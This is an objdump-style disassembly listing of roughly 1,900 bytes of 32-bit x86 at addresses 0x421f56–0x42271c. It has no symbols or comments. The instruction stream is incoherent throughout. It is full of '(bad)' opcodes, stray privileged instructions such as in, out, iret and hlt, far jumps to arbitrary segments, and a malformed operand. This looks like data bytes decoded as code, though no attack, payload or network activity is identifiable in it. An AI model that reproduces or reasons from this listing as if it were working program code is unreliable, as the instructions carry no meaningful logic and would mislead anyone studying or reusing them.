  421f56:	inc    ebp
  421f57:	fldl2t 
  421f59:	shl    DWORD PTR [edx-0x48],1
  421f5c:	test   BYTE PTR [ebx-0x6a],al
  421f5f:	cld    
  421f60:	fsubr  st,st(5)
  421f62:	add    eax,edi
  421f64:	mov    dl,BYTE PTR [ecx]
  421f66:	in     eax,dx
  421f67:	cmp    al,bl
  421f69:	and    DWORD PTR [ebx],edi
  421f6b:	or     al,0xcb
  421f6d:	aas    
  421f6e:	les    eax,FWORD PTR [eax]
	...
  421f78:	add    BYTE PTR [eax],al
  421f7a:	out    dx,al
  421f7b:	ret    0x2d9d
  421f7e:	mov    ebp,0x33c3fe7f
  421f83:	ja     0x421f4e
  421f85:	or     dh,al
  421f87:	mov    dl,0xe9
  421f89:	push   0x19ae4
  421f8e:	std    
  421f8f:	add    DWORD PTR [eax],eax
  421f91:	add    BYTE PTR ds:0x39c0347,bh
  421f97:	jp     0x421f8f
  421f99:	sahf   
  421f9a:	inc    edx
  421f9b:	aaa    
  421f9c:	in     eax,dx
  421f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f9e:	mov    ecx,0xdf007e78
  421fa3:	iret   
  421fa4:	rcr    al,1
  421fa6:	int3   
  421fa7:	out    0xe6,al
  421fa9:	push   esp
  421faa:	stos   DWORD PTR es:[edi],eax
  421fab:	icebp  
  421fac:	xchg   ebp,eax
  421fad:	mov    ebx,0xe7eab580
  421fb2:	pop    ebp
  421fb3:	sbb    al,0x23
  421fb5:	or     BYTE PTR [ecx+0x62],bl
  421fb8:	sub    bl,BYTE PTR [esi]
  421fba:	in     al,dx
  421fbb:	adc    al,0xc9
  421fbd:	xchg   BYTE PTR [edx],dl
  421fbf:	sbb    DWORD PTR [edi-0x72],edx
  421fc2:	das    
  421fc3:	pop    esi
  421fc4:	ins    DWORD PTR es:[edi],dx
  421fc5:	push   0x376a7882
  421fca:	or     al,0x9
  421fcc:	ds push edi
  421fce:	in     eax,dx
  421fcf:	cmp    BYTE PTR [ecx+0x35],al
  421fd2:	mov    esp,0xb036a3d7
  421fd7:	cmp    bl,cl
  421fd9:	ja     0x422044
  421fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fdd:	push   ss
  421fde:	fwait
  421fdf:	int    0x77
  421fe1:	pop    edi
  421fe2:	scas   eax,DWORD PTR es:[edi]
  421fe3:	cs mov esi,0x115a7e22
  421fe9:	or     DWORD PTR [edi+esi*4+0x0],ebx
  421fed:	xor    BYTE PTR [ecx],bl
  421fef:	mov    ecx,0x2f86ceea
  421ff4:	(bad)  
  421ff5:	xchg   sp,ax
  421ff7:	and    DWORD PTR [edx+0x603334f6],esi
  421ffd:	xor    esi,ecx
  421fff:	mov    ecx,0x3f58ec6a
  422004:	leave  
  422005:	cld    
  422006:	push   esp
  422007:	inc    edi
  422008:	sbb    al,0xb7
  42200a:	retf   
  42200b:	call   0x3ebd:0xbb1aa829
  422012:	xchg   edi,eax
  422013:	nop
  422014:	dec    ecx
  422015:	jb     0x421faf
  422017:	cmp    ch,dh
  422019:	(bad)  
  42201a:	jp     0x42202c
  42201c:	dec    esi
  42201d:	int3   
  42201e:	push   es
  42201f:	lock out dx,eax
  422021:	fadd   st,st(7)
  422023:	inc    eax
  422024:	and    eax,0x79896fe1
  422029:	sbb    edi,0x95a44743
  42202f:	arpl   WORD PTR [ebx-0x64dfe07],dx
  422035:	and    DWORD PTR [edi+esi*8-0x18d5a20a],eax
  42203c:	adc    bh,cl
  42203e:	and    BYTE PTR [ebp+0x56],0xb8
  422042:	lds    esi,FWORD PTR ds:0x1a787e45
  422048:	mov    ecx,0xa09dc8ec
  42204d:	pushf  
  42204e:	enter  0x61c4,0x26
  422052:	push   ds
  422053:	sar    BYTE PTR [edi+0x5f],cl
  422056:	inc    eax
  422057:	jbe    0x422047
  422059:	dec    ecx
  42205a:	push   ss
  42205b:	add    eax,0x6153c7d1
  422060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422061:	je     0x4220ac
  422063:	mov    cl,0xc3
  422065:	lock add edi,DWORD PTR [eax+0x56]
  422069:	push   ds
  42206a:	leave  
  42206b:	push   0xcfebe02c
  422070:	ja     0x4220c9
  422072:	int3   
  422073:	jns    0x4220c6
  422075:	pop    ss
  422076:	and    BYTE PTR [ebp-0x1f340ca2],bl
  42207c:	rcr    DWORD PTR [ecx],0x98
  42207f:	fild   QWORD PTR [edi+eax*4]
  422082:	repz adc esp,ebp
  422085:	adc    eax,0x17d09cb3
  42208a:	xchg   ebx,eax
  42208b:	jp     0x4220d9
  42208d:	add    dh,0xf4
  422090:	iret   
  422091:	xchg   edx,eax
  422092:	cwde   
  422093:	push   edx
  422094:	add    BYTE PTR [ecx],ah
  422096:	ret    
  422097:	es push edx
  422099:	xchg   esi,eax
  42209a:	cmc    
  42209b:	dec    edx
  42209c:	shl    DWORD PTR [esi],1
  42209e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209f:	jbe    0x42211a
  4220a1:	inc    eax
  4220a2:	jo     0x4220fd
  4220a4:	mov    al,ds:0xa8658ec7
  4220a9:	pop    eax
  4220aa:	cmp    DWORD PTR [edx],eax
  4220ac:	push   ebx
  4220ad:	dec    edi
  4220ae:	call   0xfa8c45b0
  4220b3:	(bad)  
  4220b4:	cmovo  eax,ecx
  4220b7:	pop    edi
  4220b8:	test   DWORD PTR [edx],0x33b187fc
  4220be:	out    dx,al
  4220bf:	jecxz  0x4220af
  4220c1:	sbb    DWORD PTR [eax-0x40bf5970],0x8562939f
  4220cb:	sub    cl,al
  4220cd:	sub    BYTE PTR [ecx+0x6b],0xe5
  4220d1:	sub    eax,0x61e274ed
  4220d6:	jae    0x42209e
  4220d8:	xchg   DWORD PTR [esi+esi*8+0x2f0ea7cd],ebx
  4220df:	aam    0x7c
  4220e1:	mov    bl,0x83
  4220e3:	test   ecx,0x79df98da
  4220e9:	je     0x42215d
  4220eb:	mov    dh,0xb3
  4220ed:	sbb    eax,0x44f316d1
  4220f2:	cmp    ebp,edx
  4220f4:	adc    eax,0x6818e719
  4220f9:	push   cs
  4220fa:	stc    
  4220fb:	or     al,0xe
  4220fd:	fistp  WORD PTR [edi+ebp*4]
  422100:	jns    0x4220d9
  422102:	push   0x75
  422104:	in     al,0xcb
  422106:	pop    esp
  422107:	int3   
  422108:	inc    ecx
  422109:	cs fisttp WORD PTR cs:[edx]
  42210d:	pop    ebx
  42210e:	inc    edx
  42210f:	xor    BYTE PTR [ecx+0x24],dl
  422112:	push   es
  422113:	push   cs
  422114:	loope  0x422174
  422116:	xchg   ebx,eax
  422117:	fs popf 
  422119:	ret    0xcb59
  42211c:	test   eax,0x42e2190c
  422121:	retf   0x1510
  422124:	retf   
  422125:	xchg   edx,eax
  422126:	sbb    al,0xbe
  422128:	stc    
  422129:	das    
  42212a:	jnp    0x422134
  42212c:	mov    esi,0xbec42bcb
  422131:	xor    cl,dl
  422133:	lods   al,BYTE PTR ds:[esi]
  422134:	and    edx,edi
  422136:	sub    eax,0xee7201a1
  42213b:	out    0x8c,al
  42213d:	mov    edx,0x4497dc94
  422142:	add    DWORD PTR [ebx],0x38
  422145:	ret    0xb5a0
  422148:	inc    ebx
  422149:	ins    DWORD PTR es:[edi],dx
  42214a:	cld    
  42214b:	es mov ebp,0xe0cb6c40
  422151:	add    DWORD PTR [eax-0x16c1cffb],eax
  422157:	fwait
  422158:	lds    edx,FWORD PTR [esi-0x3c]
  42215b:	fs mov bl,0x5c
  42215e:	jns    0x422188
  422160:	sbb    BYTE PTR [ebx],ch
  422162:	test   DWORD PTR [eax+0x3c8a29b8],ebp
  422168:	dec    edi
  422169:	into   
  42216a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42216b:	jno    0x42216b
  42216d:	test   al,0x3
  42216f:	pop    ecx
  422170:	fild   WORD PTR [ecx-0x278714b5]
  422176:	jnp    0x422188
  422178:	cmp    DWORD PTR [edi],esi
  42217a:	push   ds
  42217b:	pop    ecx
  42217c:	lea    ebx,[ecx-0x3c336fdf]
  422182:	xchg   esi,eax
  422183:	push   esi
  422184:	jmp    0x5fb91aec
  422189:	loopne 0x42215b
  42218b:	in     eax,0x74
  42218d:	mov    esp,0x42
	...
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0x75],0xe14bb6ca
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	std    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    BYTE PTR [edi+ecx*1+0x525e8c21],ah
  4221b8:	icebp  
  4221b9:	mov    ebx,0x6c499108
  4221be:	push   edx
  4221bf:	and    edx,DWORD PTR [edx+0x368c142b]
  4221c5:	push   ebp
  4221c6:	vaddss xmm6,xmm1,DWORD PTR [esi]
  4221ca:	sub    al,0xfa
  4221cc:	jge    0x422225
  4221ce:	outs   dx,BYTE PTR ds:[esi]
  4221cf:	mov    cl,BYTE PTR [ebp+0x2c8afe2a]
  4221d5:	adc    al,BYTE PTR [eax+0x634b63c6]
  4221db:	push   es
  4221dc:	shr    BYTE PTR [edx+0x47],0xcc
  4221e0:	aaa    
  4221e1:	add    al,0x1f
  4221e3:	inc    edx
  4221e4:	cmp    ch,ch
  4221e6:	ins    BYTE PTR es:[edi],dx
  4221e7:	cmp    DWORD PTR [ecx+0x7e],edx
  4221ea:	dec    esi
  4221eb:	pop    ebx
  4221ec:	into   
  4221ed:	and    edi,DWORD PTR [ecx]
  4221ef:	clc    
  4221f0:	jle    0x422178
  4221f2:	retf   0x80c4
  4221f5:	cli    
  4221f6:	leave  
  4221f7:	je     0x4221eb
  4221f9:	cld    
  4221fa:	test   ch,ch
  4221fc:	xchg   edx,eax
  4221fd:	mov    DWORD PTR [ebx+0x5a9b310d],ecx
  422203:	jmp    0x42221f
  422205:	mov    eax,ds:0xa88964f7
  42220a:	mov    ebx,0x30cd2030
  42220f:	je     0x4221fc
  422211:	mov    dl,0x9d
  422213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422214:	and    eax,0xfa8fb059
  422219:	test   al,0x9c
  42221b:	sbb    eax,0xf1cafc6c
  422220:	sbb    al,0x1e
  422222:	cwde   
  422223:	js     0x422224
  422225:	sbb    BYTE PTR [edx+0x4c],ch
  422228:	test   DWORD PTR [edx+ecx*8+0x2a],edi
  42222c:	push   edi
  42222d:	sub    eax,0x826d6c94
  422232:	sub    cl,cl
  422234:	xor    al,BYTE PTR [eax-0x2e]
  422237:	inc    esp
  422238:	push   ebp
  422239:	outs   dx,BYTE PTR ds:[esi]
  42223a:	add    esp,esp
  42223c:	sub    al,BYTE PTR [edi-0xf]
  42223f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422240:	fild   QWORD PTR [ebp+0x41]
  422243:	out    dx,eax
  422244:	sahf   
  422245:	not    DWORD PTR [ecx+edi*1]
  422248:	pop    eax
  422249:	inc    ebx
  42224a:	fwait
  42224b:	xchg   edi,eax
  42224c:	cld    
  42224d:	mov    cl,0xe9
  42224f:	icebp  
  422250:	adc    eax,0xb7230a3a
  422255:	push   ds
  422256:	xchg   ebx,eax
  422257:	adc    al,0xa6
  422259:	jb     0x422246
  42225b:	sub    dl,BYTE PTR [ebx]
  42225d:	mov    esi,0x8ae458
  422262:	out    dx,al
  422263:	pop    eax
  422264:	mov    dh,0xa1
  422266:	mov    edi,0x167cdf38
  42226b:	in     eax,dx
  42226c:	and    esp,DWORD PTR ds:0x92f0948d
  422272:	aaa    
  422273:	push   eax
  422274:	shr    BYTE PTR [ecx-0x380d6f06],1
  42227a:	repz xlat BYTE PTR ds:[ebx]
  42227c:	dec    esi
  42227d:	sbb    al,0xf0
  42227f:	jno    0x42229d
  422281:	dec    ecx
  422282:	adc    eax,0x6c9296fa
  422287:	dec    ecx
  422288:	mov    BYTE PTR [ebp-0x10],0x2a
  42228c:	adc    esp,ebx
  42228e:	mov    dh,0x30
  422290:	mov    dh,0x38
  422292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422293:	jmp    0x3a3b:0xacd008b4
  42229a:	std    
  42229b:	(bad)  
  42229c:	push   ebp
  42229d:	mov    ds:0xd18b131b,al
  4222a2:	sbb    bl,BYTE PTR [eax]
  4222a4:	pop    ebx
  4222a5:	sbb    DWORD PTR ss:[ebx],esi
  4222a8:	fnstcw WORD PTR [edx]
  4222aa:	test   DWORD PTR [eax+0x59],ebx
  4222ad:	sti    
  4222ae:	sub    DWORD PTR [edi-0xc],edi
  4222b1:	xchg   DWORD PTR [ebx+0x60f24f84],esi
  4222b7:	fisub  WORD PTR [ebx+edi*1-0x6b]
  4222bb:	fs push es
  4222bd:	clc    
  4222be:	mov    esp,0xfb80feec
  4222c3:	add    ch,ch
  4222c5:	int    0x45
  4222c7:	dec    edi
  4222c8:	(bad)  
  4222c9:	aam    0x49
  4222cb:	out    dx,eax
  4222cc:	push   0x1a
  4222ce:	adc    BYTE PTR [esi],cl
  4222d0:	(bad)  
  4222d1:	adc    eax,0x69719682
  4222d6:	push   esi
  4222d7:	mov    ebx,esi
  4222d9:	div    DWORD PTR [edi]
  4222db:	push   esi
  4222dc:	outs   dx,BYTE PTR ds:[esi]
  4222dd:	jno    0x42230e
  4222df:	mov    bh,0xf9
  4222e1:	cmp    DWORD PTR [edi+0x42],eax
  4222e4:	pop    ss
  4222e5:	loop   0x422302
  4222e7:	pop    ecx
  4222e8:	push   ebx
  4222e9:	adc    ecx,DWORD PTR [edx]
  4222eb:	fs or  ecx,0xffffffd4
  4222ef:	(bad)  
  4222f0:	push   esi
  4222f1:	fwait
  4222f2:	push   esi
  4222f3:	dec    edi
  4222f4:	shl    DWORD PTR [esi+ebp*2-0x59ebd14d],cl
  4222fb:	xlat   BYTE PTR ds:[ebx]
  4222fc:	adc    eax,0xc6c80c9c
  422301:	cdq    
  422302:	sbb    BYTE PTR [eax+ecx*2],dh
  422305:	fimul  WORD PTR [ecx]
  422307:	jge    0x42232b
  422309:	(bad)  
  42230a:	xor    DWORD PTR [ecx+0x2200f9f],edi
  422310:	bound  edx,QWORD PTR [ebx+ebx*8-0x9]
  422314:	fld    DWORD PTR [eax+esi*4-0x76]
  422318:	(bad)  
  422319:	mov    edx,0xbaef80d1
  42231e:	popa   
  42231f:	shr    DWORD PTR [ecx],cl
  422321:	mov    ebx,edi
  422323:	out    dx,al
  422324:	mov    ebx,DWORD PTR [edi-0x6c]
  422327:	popa   
  422328:	inc    esi
  422329:	lock iret 
  42232b:	aas    
  42232c:	adc    DWORD PTR [edi-0x38],ecx
  42232f:	push   ebx
  422330:	mov    esi,0x947115e4
  422335:	xor    edx,edx
  422337:	mov    ch,0x32
  422339:	cmp    dh,BYTE PTR [ebp+0x444b79d6]
  42233f:	push   cs
  422340:	retf   0xb54f
  422343:	mov    WORD PTR [esi+0x670dee61],ds
  422349:	clc    
  42234a:	push   ss
  42234b:	jmp    FWORD PTR [edi-0x4a1ec8b6]
  422351:	test   eax,0xd36b02ec
  422356:	jmp    0xa1a3:0xf72d1901
  42235d:	test   al,cl
  42235f:	sar    BYTE PTR [ebx-0x13150366],0xc5
  422366:	cmp    al,0x29
  422368:	xchg   esi,eax
  422369:	jle    0x422301
  42236b:	test   eax,0x16e27c4f
  422370:	lock ret 0xa51a
  422374:	call   0xfb12039b
  422379:	sahf   
  42237a:	(bad)  
  42237b:	cli    
  42237c:	cs dec esi
  42237e:	mov    ah,0xee
  422380:	lahf   
  422381:	sbb    DWORD PTR [ecx+0x0],0xaf900c4b
  422388:	add    eax,0x1990ca12
  42238d:	(bad)  
  42238e:	aas    
  42238f:	add    bl,ch
  422391:	jbe    0x422350
  422393:	pop    esi
  422394:	fdiv   QWORD PTR [ebx]
  422396:	mov    dl,0xff
  422398:	fsub   DWORD PTR [ebp+0x7b978d1b]
  42239e:	(bad)  
  42239f:	aam    0x48
  4223a1:	(bad)  
  4223a2:	out    dx,eax
  4223a3:	xor    ch,BYTE PTR [ecx+0xdb5b4]
  4223a9:	sub    al,0x4c
  4223ab:	(bad)  
  4223ac:	mov    cl,0xf4
  4223ae:	sub    al,BYTE PTR [eax]
	...
  4223b8:	add    BYTE PTR [eax],al
  4223ba:	adc    DWORD PTR [esi],ecx
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	mov    DWORD PTR [esp+esi*8+0x19ede77],eax
  4223cd:	add    ch,bh
  4223cf:	add    DWORD PTR [eax],eax
  4223d1:	add    BYTE PTR [eax-0x23],bl
  4223d4:	cmp    al,0x9
  4223d6:	sub    al,0x6a
  4223d8:	repz pop es
  4223da:	je     0x4223c7
  4223dc:	xor    al,0x97
  4223de:	cmc    
  4223df:	add    ebp,ebx
  4223e1:	lods   al,BYTE PTR ds:[esi]
  4223e2:	ret    0x988a
  4223e5:	xor    ebx,DWORD PTR [ecx+0x42]
  4223e8:	pop    esi
  4223e9:	adc    DWORD PTR [esi-0x5a],edi
  4223ec:	mov    DWORD PTR [esi-0x2c],0xe9e1986e
  4223f3:	push   ss
  4223f4:	dec    ecx
  4223f5:	jnp    0x422476
  4223f7:	push   0xb55be5f9
  4223fc:	call   0x1612:0x82e9b572
  422403:	pop    edi
  422404:	jg     0x422393
  422406:	stos   DWORD PTR es:[edi],eax
  422407:	mov    bh,0x7
  422409:	mov    bh,0x7a
  42240b:	xchg   edi,eax
  42240c:	pop    edi
  42240d:	xor    cl,BYTE PTR [ecx+0x41]
  422410:	mov    WORD PTR [ecx-0x13],?
  422413:	mov    BYTE PTR [esi],ah
  422415:	retf   0xb2e3
  422418:	add    al,0xbb
  42241a:	push   cs
  42241b:	pop    ss
  42241c:	into   
  42241d:	pushf  
  42241e:	(bad)
  422422:	scas   eax,DWORD PTR es:[edi]
  422423:	jae    0x422468
  422425:	ins    BYTE PTR es:[edi],dx
  422426:	push   ds
  422427:	imul   esi,DWORD PTR ds:[edx+0xd7ea4e0],0xff54a65a
  422432:	jecxz  0x4223ce
  422434:	lods   al,BYTE PTR ds:[esi]
  422435:	or     ch,BYTE PTR [edx+0x3e095ec9]
  42243b:	mov    esi,0x36a3897e
  422440:	hlt    
  422441:	mov    bl,0xf
  422443:	sbb    edi,eax
  422445:	ins    DWORD PTR es:[edi],dx
  422446:	sar    dh,cl
  422448:	xor    eax,0xbf6fcddf
  42244d:	fsubrp st(5),st
  42244f:	add    eax,esi
  422451:	add    DWORD PTR [edx-0x18526dc],0x39
  422458:	jg     0x42245e
  42245a:	gs iret 
  42245c:	adc    ah,BYTE PTR [edi+ebp*4-0x4e]
  422460:	pop    es
  422461:	lods   eax,DWORD PTR ds:[esi]
  422463:	push   edi
  422464:	sub    ecx,DWORD PTR [ebx-0x37]
  422467:	and    DWORD PTR [edx-0x445b914c],ebp
  42246d:	and    ah,BYTE PTR [eax+0x70fcc468]
  422473:	(bad)  
  422474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422476:	inc    edi
  422477:	mov    al,ds:0x412302fa
  42247c:	xor    eax,0x5d78b554
  422481:	outs   dx,DWORD PTR ds:[esi]
  422482:	das    
  422483:	jg     0x42249b
  422485:	mov    ss:0x414325e,eax
  42248b:	and    BYTE PTR [edx],0x70
  42248e:	popa   
  42248f:	add    DWORD PTR [ecx+ebp*1+0x3d],edx
  422493:	les    eax,FWORD PTR ds:0x56065d00
  422499:	shl    DWORD PTR [esi],0xdc
  42249c:	pop    es
  42249d:	shl    DWORD PTR [ebx-0x71576807],cl
  4224a3:	mov    esp,DWORD PTR [esi+edx*1-0x33e492df]
  4224aa:	ret    
  4224ab:	mov    ebx,0x4046ea39
  4224b0:	outs   dx,BYTE PTR ds:[esi]
  4224b1:	fld    st(6)
  4224b3:	lds    ebx,FWORD PTR [edi+0x304f80b]
  4224b9:	imul   ebx,edi,0xffffffec
  4224bc:	call   0x43ce2e11
  4224c1:	(bad)  
  4224c2:	jecxz  0x422509
  4224c4:	adc    DWORD PTR [esi+ecx*4+0x4d],edx
  4224c8:	jae    0x42249f
  4224ca:	das    
  4224cb:	inc    ebp
  4224cc:	ins    DWORD PTR es:[edi],dx
  4224cd:	add    al,0x1c
  4224cf:	and    esi,ecx
  4224d1:	adc    cl,BYTE PTR [ebp-0x25]
  4224d4:	lea    ebp,[edx+0x1a17789a]
  4224da:	and    al,0x59
  4224dc:	dec    ebx
  4224dd:	lds    ecx,FWORD PTR [edi-0x7e6948a3]
  4224e3:	aam    0x65
  4224e5:	(bad)  
  4224e6:	mov    edx,0xbcf6f91a
  4224eb:	(bad)  
  4224ed:	in     al,dx
  4224ee:	nop
  4224ef:	retf   
  4224f0:	add    esp,DWORD PTR [ebp+0x4c3a52b4]
  4224f6:	hlt    
  4224f7:	rol    DWORD PTR [esi+0x47],1
  4224fa:	jl     0x4224cb
  4224fc:	jnp    0x422572
  4224fe:	push   eax
  4224ff:	mov    ah,0x4f
  422501:	sbb    eax,0x1cbcfa33
  422506:	je     0x422518
  422508:	popf   
  422509:	addr16 int 0xc8
  42250c:	inc    edx
  42250d:	dec    eax
  42250e:	fmul   QWORD PTR [ecx+0x54]
  422511:	ftst   
  422513:	mov    ch,0xd3
  422515:	jle    0x422511
  422517:	cmc    
  422518:	or     DWORD PTR [esi],edx
  42251a:	mov    ds:0xd08e6456,eax
  42251f:	mov    edi,DWORD PTR [ecx-0x6930bbd5]
  422525:	jo     0x422570
  422527:	mov    ds:0xe2982c3,al
  42252c:	iret   
  42252d:	into   
  42252e:	add    BYTE PTR [edx-0x6a],bl
  422531:	es push ebx
  422533:	add    al,0xde
  422535:	sub    esp,DWORD PTR [esi+ebx*4+0x15]
  422539:	mov    dl,0x71
  42253b:	montmul (bad)
  42253c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42253d:	pop    es
  42253e:	sbb    dh,ah
  422540:	ins    DWORD PTR es:[edi],dx
  422541:	jb     0x422575
  422543:	jbe    0x422544
  422545:	xchg   ecx,eax
  422546:	inc    esp
  422547:	dec    edi
  422548:	ret    
  422549:	scas   eax,DWORD PTR es:[edi]
  42254a:	cmp    eax,0x48ca904a
  42254f:	outs   dx,DWORD PTR ds:[esi]
  422550:	clc    
  422551:	(bad)  
  422552:	out    dx,al
  422553:	cmp    BYTE PTR [edx],cl
  422555:	neg    BYTE PTR [ebx-0x3bc8b58b]
  42255b:	repnz sub edi,esp
  42255e:	cld    
  42255f:	jmp    0x422556
  422561:	and    ch,al
  422563:	jmp    0x2ba92874
  422568:	xor    BYTE PTR [esi+0x45],al
  42256b:	aaa    
  42256c:	jl     0x422576
  42256e:	push   ecx
  42256f:	inc    edi
  422570:	stc    
  422571:	stos   DWORD PTR es:[edi],eax
  422572:	pop    edx
  422573:	test   BYTE PTR [edi+0x635363a2],al
  422579:	call   0xe690150d
  42257e:	stos   BYTE PTR es:[edi],al
  42257f:	mov    cl,0x52
  422581:	mov    ecx,0x31e7950d
  422586:	sub    eax,0xd2b1272
  42258b:	sub    BYTE PTR [ecx-0x64],ah
  42258e:	ins    BYTE PTR es:[edi],dx
  42258f:	sar    BYTE PTR [esi],cl
  422591:	push   ss
  422592:	jb     0x4225d5
  422594:	add    cl,BYTE PTR [eax-0x1e]
  422597:	fild   DWORD PTR [ebx+edi*4]
  42259a:	mov    WORD PTR [ecx],es
  42259c:	ja     0x422523
  42259e:	les    edi,FWORD PTR [esi+0x44]
  4225a1:	mov    ah,0xa9
  4225a3:	push   ebp
  4225a4:	adc    al,0x6c
  4225a6:	(bad)  
  4225a7:	fisub  DWORD PTR [esi+ebp*4-0x1ad97049]
  4225ae:	sbb    ecx,ebp
  4225b0:	mov    ebx,0x925db409
  4225b5:	out    0x8a,eax
  4225b7:	dec    ecx
  4225b8:	push   es
  4225b9:	cdq    
  4225ba:	mov    bl,0x38
  4225bc:	(bad)  
  4225bd:	adc    eax,0xdd6f9610
  4225c2:	mov    dh,0x18
  4225c4:	out    0xea,eax
  4225c6:	lea    ebx,[edi]
  4225c8:	rcr    al,1
  4225ca:	es aas 
  4225cc:	or     DWORD PTR [ecx+0xb4],0x0
  4225d6:	add    BYTE PTR [eax],al
  4225d8:	add    BYTE PTR [eax],al
  4225da:	leave  
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    esi,DWORD PTR [ecx-0x2469b024]
  4225eb:	mov    al,ds:0x1fd0001
  4225f0:	add    BYTE PTR [eax],al
  4225f2:	ds jmp 0x498:0x215df26a
  4225fa:	sbb    DWORD PTR [eax+0x52],edi
  4225fd:	and    edx,DWORD PTR [ecx+0x20bcd716]
  422603:	ins    DWORD PTR es:[edi],dx
  422604:	fwait
  422605:	or     ch,cl
  422607:	jl     0x4225d1
  422609:	out    dx,eax
  42260a:	sbb    eax,esp
  42260c:	dec    BYTE PTR [eax+0x2e]
  42260f:	daa    
  422610:	mov    ch,0x1e
  422612:	imul   eax,ebx,0xe343aa5
  422618:	jae    0x42266e
  42261a:	inc    edx
  42261b:	fcmovb st,st(3)
  42261d:	dec    eax
  42261e:	dec    edx
  42261f:	hlt    
  422620:	dec    edi
  422621:	xor    BYTE PTR [eax],al
  422623:	push   edi
  422624:	jp     0x422691
  422626:	jnp    0x422631
  422628:	and    DWORD PTR [edi-0x11b24175],ebp
  42262e:	into   
  42262f:	pop    esp
  422630:	push   es
  422631:	cmp    DWORD PTR [ebx-0x3b10310a],0xffffffbc
  422638:	jl     0x422673
  42263a:	adc    BYTE PTR [edx-0x5d],dl
  42263d:	jl     0x422660
  42263f:	push   ds
  422640:	ret    
  422641:	sbb    edx,DWORD PTR [esi+0x10]
  422644:	hlt    
  422645:	push   esp
  422646:	xlat   BYTE PTR ds:[ebx]
  422647:	out    dx,eax
  422648:	adc    ebp,ebp
  42264a:	(bad)  
  42264b:	jl     0x422601
  42264d:	xor    ebx,DWORD PTR [edi]
  42264f:	or     DWORD PTR [edi-0x687b5b96],esi
  422655:	pop    ss
  422656:	scas   eax,DWORD PTR es:[edi]
  422657:	xchg   ecx,eax
  422658:	loop   0x4226b6
  42265a:	mov    al,0x11
  42265c:	push   ebx
  42265d:	pop    ecx
  42265e:	lods   eax,DWORD PTR ds:[esi]
  42265f:	and    ecx,ebx
  422661:	stos   DWORD PTR es:[edi],eax
  422662:	scas   eax,DWORD PTR es:[edi]
  422663:	out    0x4b,al
  422665:	cmp    BYTE PTR [edi+0x7f0f30ec],bl
  42266b:	xor    esp,ebx
  42266d:	cs call 0x172099a1
  422673:	sbb    BYTE PTR [eax+eiz*4-0xdb3d4c3],0xc3
  42267b:	aas    
  42267c:	imul   ebx,DWORD PTR [ebx+0x3ea118b8],0x687443a3
  422686:	in     eax,0x0
  422688:	jge    0x422677
  42268a:	hlt    
  42268b:	mov    ah,0x4d
  42268d:	test   eax,0xe30094d7
  422692:	loopne 0x42266b
  422694:	xchg   edx,eax
  422695:	pop    esi
  422696:	je     0x422637
  422698:	jmp    0x1b47:0x72bea3b9
  42269f:	fdiv   QWORD PTR [esi-0x1ff8e390]
  4226a5:	xor    cl,BYTE PTR [esi]
  4226a7:	mov    ah,0xa4
  4226a9:	lea    esi,[ebx+0x42ec93f7]
  4226af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226b0:	pop    es
  4226b1:	scas   eax,DWORD PTR es:[edi]
  4226b2:	push   esp
  4226b3:	sbb    al,BYTE PTR [eax]
  4226b5:	and    eax,0x6fd476ee
  4226ba:	outs   dx,BYTE PTR ds:[esi]
  4226bb:	ss pop ebp
  4226bd:	les    edx,FWORD PTR [eax+edi*4+0x32]
  4226c1:	xchg   edx,eax
  4226c2:	test   eax,0xfe24b58b
  4226c7:	sbb    BYTE PTR [esi],bl
  4226c9:	xlat   BYTE PTR ds:[ebx]
  4226ca:	mov    DWORD PTR [edx+0x45598cc],esp
  4226d0:	jp     0x4226a5
  4226d2:	jle    0x42271a
  4226d4:	dec    edx
  4226d5:	je     0x42267e
  4226d7:	jg     0x4226ed
  4226d9:	xor    BYTE PTR [eax+0x4e],0x15
  4226dd:	xor    ecx,edx
  4226df:	add    ebx,DWORD PTR [esi-0x2d]
  4226e2:	out    dx,al
  4226e3:	pop    eax
  4226e4:	jp     0x42275f
  4226e6:	loop   0x4226f6
  4226e8:	inc    edi
  4226e9:	xlat   BYTE PTR ds:[ebx]
  4226ea:	ret    
  4226eb:	xchg   esi,eax
  4226ec:	fxtract 
  4226ee:	imul   edx,DWORD PTR [esi+edx*2],0xd67b9df4
  4226f5:	fwait
  4226f6:	cmp    eax,0xb588eed8
  4226fb:	push   ebx
  4226fc:	push   es
  4226fd:	sti    
  4226fe:	imul   ecx,DWORD PTR [eax-0x6c90360f],0xffffffec
  422705:	(bad)  
  422707:	jae    0x4226ff
  422709:	jg     0x4226cb
  42270b:	std    
  42270c:	jmp    0x42275f
  42270e:	(bad)  
  42270f:	cli    
  422710:	xor    ebp,edi
  422712:	fcmovnu st,st(0)
  422714:	shl    BYTE PTR [edi],cl
  422716:	ss aam 0x2d
  422719:	fwait
  42271a:	xchg   esp,eax
  42271b:	push   eax
  42271c:	inc    BYTE PTR [eax+0x20212e4d]
